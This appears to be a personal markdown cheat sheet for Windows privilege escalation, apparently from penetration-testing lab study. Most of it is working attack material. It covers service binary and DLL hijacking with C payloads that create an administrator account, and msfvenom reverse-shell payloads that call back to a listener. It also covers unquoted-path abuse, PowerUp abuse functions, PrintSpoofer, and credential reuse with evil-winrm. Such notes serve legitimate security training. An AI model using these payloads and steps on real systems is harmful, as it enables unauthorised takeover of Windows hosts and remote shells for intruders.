# Windows Privilege Escalation

## Enumerating Windows

### General

There are several key pieces of information we should always obtain:

```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

View current user:

```
whoami
```

View current user privileges:

```
whoami /priv
```

Take notes on current groups:

```
whoami /groups
```

Take notes on other users and groups on system:

```
Get-LocalUser
```

or

```
net user
```

Can be used on specific users:

```
net user steve
```

Take notes on other groups on system:

```
Get-LocalGroup
```

or

```
net localgroup
```

Check members of group:

```
Get-LocalGroupMember adminteam
```

Get system info, including architecture (important for compiling binaries)

```
systeminfo
```

List all network interfaces:

```
ipconfig /all
```

List all network routes (important for finding other systems or networks):

```
route print
```

List all active network connections:

```
netstat -ano
```

List all installed applications (both 32-bit and 64-bit):

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
```

```
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Also check both Program Files folders and the Downloads directory for more potential programs.

List all running processes: 

```
Get-Process
```

List all process paths:

```
Get-Process | Select-Object -ExpandProperty Path
```

Search file system for interesting files:

```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini,*.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

or 

```
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

List contents of directory:

```
Get-Content -Path "C:\Users\diana\Documents\*"
```

### PowerShell Transcription or Script Block Logging

Check regular history:

```
Get-History
```

Check PSReadline history:

```
(Get-PSReadlineOption).HistorySavePath
```

Cat out the contents of the file, and read for interesting transcript files.

Using Credential object and Enter-PSSSession:

```
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force

$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)

Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
```

_Some commands may not work if this is done through bind shell.

Instead those same credentials may also be used with WinRM:

```
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```

### Automated Enumeration

#### WinPEAS

Use WinPEAS:

```
cp /usr/share/peass/winpeas/winPEASx64.exe .
```

Start Python server:

```
python -m http.server
```

Use Invoke-WebRequest to download files from Python server:

```
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
```

Run WinPEAS:

```
.\winPEAS.exe
```

Comb through output looking for:

```
- Username and hostname
- Group memberships of the current user
- Existing users and groups
- Operating system, version and architecture
- Network information
- Installed applications
- Running processes
```

#### PowerUp

Use PowerUp:

```
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
```

Start Python server:

```
python -m http.server 80
```

Download PowerUp:

```
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
```

Run PowerUp:

```
.\PowerUp.ps1
```

## Windows Services Escalation

### Service Binary Hijacking (Manual)

List all installed Windows services:

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Look for binaries not running in Windows or System32, as "of interest"

_In a bind shell or WinRM, this will get Permission Denied, must be used in an interactive logon such as RDP.

Check permissions on service binaries:

```
icacls ""
```

or

```
Get-ACL ""
```

Permissions list:

| MASK | PERMISSIONS             |
| ---- | ----------------------- |
| F    | Full access             |
| M    | Modify access           |
| RX   | Read and execute access |
| R    | Read-only access        |
| W    | Write-only access       |

If we have Full or Write, we can replace the existing binary.

Create a C file such as: 

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

If the user does not have ability to add users try a reverse shell:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.171 LPORT=4444 -f exe > EnterpriseServiceOptional.exe
```

Compile the binary (ensuring the right architecture is used):

```
x86_64-w64-mingw32-gcc adduser.c -o newbinary.exe
```

Once again download file from Python server:

```
iwr -uri http://192.168.119.3/newbinary.exe -Outfile newbinary.exe
```

Use `move` to move files instead of attempting to replace the existing one.

If user has permissions to stop/start the service:

```
net stop mysql
```

Otherwise, check the type of StartMode the service has:

```
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```

Auto would mean reboot needed.

Check privileges of current user:

```
whoami /priv
```

Reboot privileges look like `SeShutdownPrivilege`. State is irrelevant.

Windows reboot command:

```
shutdown /r /t 0
```

### Service Binary Hijacking (PowerUp)

Download PowerUp:

```
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
```

Allow PowerShell to execute scripts:

```
powershell -ep bypass
```

Execute PowerUp:

```
PS C:\Users\dave>  . .\PowerUp.ps1
```

Find possible services that could be hijacked:

```
PS C:\Users\dave> Get-ModifiableServiceFile
```

Use the AbuseFunction `Install-ServiceBinary` to exploit:

```
Install-ServiceBinary -Name 'mysql'
```

_Default user/pass is john/Password123!

_This may error if the service runs with other arguments (Check Get-CmiInstance for info on this)

Troubleshooting method if function errors:

```
$ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-ModifiablePath -Literal
```

### Service DLL Hijacking

List all installed Windows services:

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Check permissions of interesting binaries (non-Windows or System directories):

```
icacls .\Documents\BetaServ.exe
```

With no Full or Write abilities can't replace the binary.

In practice, download binary to other machine and install to then monitor.

If admin privileges present, use Process Monitor to view attempted and failed DLL loads.

If a DLL library is found to be missing or replaceable, create a C file with payload:

```C
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

or

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.171 LPORT=4444 -f dll > EnterpriseServiceOptional.dll
```


Compile the DLL:

```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

Copy DLL over:

```
iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll
```

_Ensure the service can load the DLL from this directory

Restart service:

```
Restart-Service BetaService
```

### Unquoted Service Paths (Manual)

Use when permission to main or subdirectories of service, but not replace the main binary. And service is unquoted. 

How Windows parses services in directory order when unquoted:

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

Get installed Windows Services:

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
```

Using CMD, find ones with no quotes:

```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

Check if we can Start or Stop service:

```
Start-Service GammaService
```

Check permission down chain of files and folders looking for Full or Write permissions:

```
icacls ""
```

If found:

Create a C file such as: 

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

If the user does not have ability to add users try a reverse shell:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.171 LPORT=4444 -f exe > EnterpriseServiceOptional.exe
```

Compile the binary (ensuring the right architecture is used):

```
x86_64-w64-mingw32-gcc adduser.c -o newbinary.exe
```

Download binary:

```
iwr -uri http://192.168.119.3/newbinary.exe -Outfile newbinary.exe
```

Name it properly and put it in the right directory structure, then restart the service:

```
Start-Service GammaService
```

### Unquoted Service Paths (PowerUp)

Download PowerUp:

```
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
```

Allow PowerShell to execute scripts:

```
powershell -ep bypass
```

Execute PowerUp:

```
PS C:\Users\dave>  . .\PowerUp.ps1
```

Find possible unquoted services:

```
PS C:\Users\dave> Get-UnquotedService
```

If suitable location found:

```
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

_Default user/pass is john/Password123!

### Scheduled Tasks

Important:

```
- As which user account (principal) does this task get executed?
- What triggers are specified for the task?
- What actions are executed when one or more of these triggers are met?
```

Check scheduled tasks:

```
schtasks /query /fo LIST /v
```

Look for non-Windows and System owned tasks.

Check permissions with `icacls` and run possible Service Binary Hijacks or DLL Hijacks.

Use this to look for non system users:

```
schtasks /query /fo LIST /v | findstr "Author:"
```

### Other Exploits

Check for privileges:

```
- SeImpersonatePrivilege
- SeBackupPrivilege
- SeAssignPrimaryToken
- SeLoadDriver
- SeDebug
```

We can use PrintSpoofer in situations where we have code execution as a user with the privilege SeImpersonatePrivilege to execute commands or obtain an interactive shell as NT AUTHORITY/SYSTEM.

Download PrintSpoofer:
```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe 
```

Download from Python server:

```
iwr -uri http://192.168.119.2/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
```

Run PrintSpoofer:

```
.\PrintSpoofer64.exe -i -c powershell.exe
```

Other similar tools include RottenPotato, SweetPotato, or JuicyPotato.

## General Escalation Commands with Found Creds

Using Runas to get command prompt as different user:

```
runas /user:backupadmin cmd
```

Using EvilWinRM to get command prompt as user:

Instead those same credentials may also be used with WinRM:

```
evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```
